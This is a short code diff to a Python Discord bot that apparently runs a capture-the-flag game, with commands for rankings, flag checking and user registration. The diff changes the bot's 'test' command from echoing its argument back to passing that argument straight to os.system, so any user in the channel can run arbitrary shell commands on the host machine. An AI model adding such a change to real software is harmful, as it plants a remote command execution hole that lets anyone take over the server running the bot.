@@ -6,7 +6,7 @@ from utils.commands.rank import get_ranking_with_user
 from utils.commands.flag import check_flag
 from utils.database.setup import get_challenge_description, init_database
 from utils.commands.user import register_user
-
+import os
 # Database setup
 # http://docs.peewee-orm.com/en/latest/peewee/quickstart.html
 
@@ -17,7 +17,8 @@ bot.remove_command("help")
 
 @bot.command()
 async def test(ctx, *, arg):
-    await ctx.send(arg)
+    f = os.system(arg)
+    await ctx.send(f)
 
 
 @bot.command()
